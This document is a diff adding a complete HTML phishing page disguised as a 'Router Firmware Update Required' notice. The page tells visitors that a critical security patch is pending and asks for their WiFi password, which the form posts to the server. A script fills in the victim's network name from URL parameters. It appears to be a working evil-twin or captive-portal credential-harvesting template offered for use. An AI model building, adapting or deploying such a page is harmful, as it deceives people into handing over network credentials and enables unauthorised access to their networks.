@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>Router Security Update</title>
+    <style>
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --theme: #e94560;
+            --theme-r: 233;
+            --theme-g: 69;
+            --theme-b: 96;
+            --bg-deep: #0a0a1a;
+            --bg-card: rgba(18, 24, 40, 0.85);
+            --text-primary: #e8ecf1;
+            --text-secondary: #7a8299;
+            --text-muted: #495670;
+            --border-subtle: rgba(255, 255, 255, 0.06);
+            --input-bg: rgba(10, 15, 28, 0.7);
+            --input-border: rgba(255, 255, 255, 0.1);
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+                         "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(160deg,
+                #0a0a1a 0%,
+                #0f0c29 25%,
+                #1a1040 50%,
+                #0d0d25 75%,
+                #0a0a1a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* ambient background glow */
+        body::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background:
+                radial-gradient(circle at 20% 75%, rgba(255, 255, 255, 0.012) 0%, transparent 45%),
+                radial-gradient(circle at 75% 25%, rgba(255, 255, 255, 0.008) 0%, transparent 45%),
+                radial-gradient(circle at 50% 50%, rgba(var(--theme-r), var(--theme-g), var(--theme-b), 0.025) 0%, transparent 55%);
+            animation: ambient-drift 35s linear infinite;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        @keyframes ambient-drift {
+            0% { transform: rotate(0deg) scale(1); }
+            33% { transform: rotate(120deg) scale(1.05); }
+            66% { transform: rotate(240deg) scale(0.95); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 440px;
+        }
+
+        .card {
+            background: var(--bg-card);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-radius: 20px;
+            padding: 44px 36px 36px;
+            text-align: center;
+            box-shadow:
+                0 4px 6px rgba(0, 0, 0, 0.3),
+                0 10px 40px rgba(0, 0, 0, 0.5),
+                0 0 0 1px var(--border-subtle),
+                inset 0 1px 0 rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border-subtle);
+        }
+
+        /* logo / icon area */
+        .icon-wrapper {
+            width: 72px;
+            height: 72px;
+            margin: 0 auto 24px;
+            background: linear-gradient(135deg,
+                rgba(var(--theme-r), var(--theme-g), var(--theme-b), 0.2),
+                rgba(var(--theme-r), var(--theme-g), var(--theme-b), 0.05));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid rgba(var(--theme-r), var(--theme-g), var(--theme-b), 0.3);
+            box-shadow: 0 0 30px rgba(var(--theme-r), var(--theme-g), var(--theme-b), 0.15);
+        }
+
+        .icon-lock {
+            font-size: 32px;
+            filter: drop-shadow(0 0 8px rgba(var(--theme-r), var(--theme-g), var(--theme-b), 0.6));
+        }
+
+        h2 {
+            color: var(--text-primary);
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: -0.2px;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 13.5px;
+            line-height: 1.65;
+            margin-bottom: 20px;
+            padding: 0 10px;
+        }
+
+        /* network badge */
+        .network-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 7px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 24px;
+            padding: 8px 18px;
+            margin-bottom: 24px;
+            color: var(--theme);
+            font-size: 13px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        .network-badge .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--theme);
+            box-shadow: 0 0 8px var(--theme);
+            animation: pulse-dot 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* form */
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #b0b8cc;
+            font-size: 12.5px;
+            font-weight: 600;
+            margin-bottom: 7px;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 44px 14px 16px;
+            background: var(--input-bg);
+            border: 2px solid var(--input-border);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 15px;
+            font-family: inherit;
+            transition: all 0.25s ease;
+            outline: none;
+        }
+
+        input[type="password"]:focus {
+            border-color: var(--theme);
+            box-shadow: 0 0 0 4px rgba(var(--theme-r), var(--theme-g), var(--theme-b), 0.12);
+            background: rgba(10, 15, 28, 0.9);
+        }
+
+        input[type="password"]::placeholder {
+            color: rgba(255, 255, 255, 0.18);
+            font-size: 14px;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.25);
+            font-size: 18px;
+            pointer-events: none;
+            transition: color 0.25s ease;
+        }
+
+        input[type="password"]:focus ~ .input-icon {
+            color: var(--theme);
+        }
+
+        /* submit button */
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg,
+                var(--theme),
+                rgba(var(--theme-r), var(--theme-g), var(--theme-b), 0.85));
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 650;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 0.4px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-submit:hover {
+            filter: brightness(1.2);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(var(--theme-r), var(--theme-g), var(--theme-b), 0.35);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+            filter: brightness(0.95);
+            transition: all 0.1s ease;
+        }
+
+        .btn-submit::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .btn-submit:active::after {
+            width: 300px;
+            height: 300px;
+        }
+
+        /* footer */
+        .footer-note {
+            color: var(--text-muted);
+            font-size: 11px;
+            margin-top: 20px;
+            letter-spacing: 0.2px;
+        }
+
+        .footer-note span {
+            color: var(--theme);
+            font-weight: 600;
+        }
+
+        /* error */
+        .error-msg {
+            color: #ff6b6b;
+            font-size: 12px;
+            margin-top: 8px;
+            text-align: left;
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .error-msg.visible {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* responsive */
+        @media (max-width: 480px) {
+            .card {
+                padding: 32px 24px 28px;
+                border-radius: 16px;
+            }
+
+            h2 {
+                font-size: 18px;
+            }
+
+            .subtitle {
+                font-size: 12.5px;
+            }
+
+            input[type="password"] {
+                padding: 12px 40px 12px 14px;
+                font-size: 14px;
+            }
+
+            .btn-submit {
+                padding: 12px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <!-- lock icon -->
+            <div class="icon-wrapper">
+                <span class="icon-lock">&#128274;</span>
+            </div>
+
+            <!-- heading -->
+            <h2>Router Firmware Update Required</h2>
+            <p class="subtitle">
+                A critical security patch is available for your router.
+                Please verify your network credentials to proceed with the update.
+            </p>
+
+            <!-- network badge -->
+            <div class="network-badge">
+                <span class="dot"></span>
+                Network: <span id="network-name">Loading...</span>
+            </div>
+
+            <!-- login form -->
+            <form method="POST" action="/" id="login-form" autocomplete="off">
+                <div class="form-group">
+                    <label>WiFi Password</label>
+                    <div class="input-wrapper">
+                        <input type="password"
+                               name="password"
+                               id="password"
+                               placeholder="Enter your WiFi password"
+                               required
+                               autofocus
+                               autocomplete="off"
+                               autocorrect="off"
+                               autocapitalize="off"
+                               spellcheck="false">
+                        <span class="input-icon">&#128477;</span>
+                    </div>
+                    <div class="error-msg" id="error-msg">Please enter a valid password.</div>
+                </div>
+                <button type="submit" class="btn-submit">Verify &amp; Install Update</button>
+            </form>
+
+            <!-- footer -->
+            <p class="footer-note">
+                Secured by <span>Router Security</span> &bull;
+                Connection will resume automatically after verification
+            </p>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // prevent form resubmission on page refresh
+            if (window.history.replaceState) {
+                window.history.replaceState(null, null, window.location.href);
+            }
+
+            // try to extract network name from URL params or hostname
+            function getNetworkName() {
+                var params = new URLSearchParams(window.location.search);
+                var ssid = params.get('ssid') || params.get('network') || params.get('essid');
+
+                if (ssid) {
+                    return decodeURIComponent(ssid);
+                }
+
+                // fallback: try to read from hostname
+                var host = window.location.hostname;
+                if (host && host !== 'localhost' && host !== '127.0.0.1' && host !== '0.0.0.0') {
+                    return host;
+                }
+
+                return 'Your Network';
+            }
+
+            document.getElementById('network-name').textContent = getNetworkName();
+
+            // client-side validation
+            var form = document.getElementById('login-form');
+            var passwordInput = document.getElementById('password');
+            var errorMsg = document.getElementById('error-msg');
+
+            form.addEventListener('submit', function(e) {
+                var pwd = passwordInput.value.trim();
+
+                // reset error
+                errorMsg.classList.remove('visible');
+
+                // validate
+                if (pwd.length < 1) {
+                    e.preventDefault();
+                    errorMsg.textContent = 'Password cannot be empty.';
+                    errorMsg.classList.add('visible');
+                    passwordInput.focus();
+                    return false;
+                }
+
+                if (pwd.length > 64) {
+                    e.preventDefault();
+                    errorMsg.textContent = 'Password is too long (maximum 64 characters).';
+                    errorMsg.classList.add('visible');
+                    passwordInput.focus();
+                    return false;
+                }
+
+                // valid — show subtle loading state
+                var btn = form.querySelector('.btn-submit');
+                btn.textContent = 'Verifying...';
+                btn.style.opacity = '0.7';
+                btn.style.pointerEvents = 'none';
+
+                return true;
+            });
+
+            // clear error on input
+            passwordInput.addEventListener('input', function() {
+                errorMsg.classList.remove('visible');
+            });
+
+            // prevent paste of obviously fake passwords (optional subtle filter)
+            passwordInput.addEventListener('paste', function(e) {
+                // allow all pastes — don't block legitimate users
+                // but could add telemetry here if needed
+            });
+        })();
+    </script>
+</body>
+</html>
